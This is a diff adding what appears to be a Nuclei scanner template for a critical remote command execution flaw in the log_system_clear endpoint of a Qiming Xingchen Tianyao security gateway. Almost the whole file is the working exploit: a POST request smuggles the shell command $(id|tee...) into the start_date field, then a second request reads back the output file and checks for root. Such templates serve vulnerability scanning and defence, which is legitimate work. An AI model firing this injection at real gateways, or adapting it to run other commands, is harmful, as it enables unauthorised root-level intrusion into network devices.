@@ -1,0 +1,33 @@
+id: qimingxingchen-rce-log-system-clear
+info:
+  name: qimingxingchen-tianyao-anquanwangguan-rce-log_system_clear
+  author: qimingxingchen-tianyao-anquanwangguan-rce-log_system_clear
+  severity: critical
+  
+http:
+  - raw:
+      - |-
+        POST /webui/?g=log_system_clear HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (compatible; MSIE 7.0; Windows 95; Trident/3.0)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 54
+
+        start_date=$(id|tee${IFS}.2UYSbPc6bTnYAxAksBmtlyQSTUk)
+      - |+
+        GET /webui/.2UYSbPc6bTnYAxAksBmtlyQSTUk HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (compatible; MSIE 7.0; Windows 95; Trident/3.0)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 0
+
+    redirects: false
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains_all(body, 'uid=','root') && status_code==200"
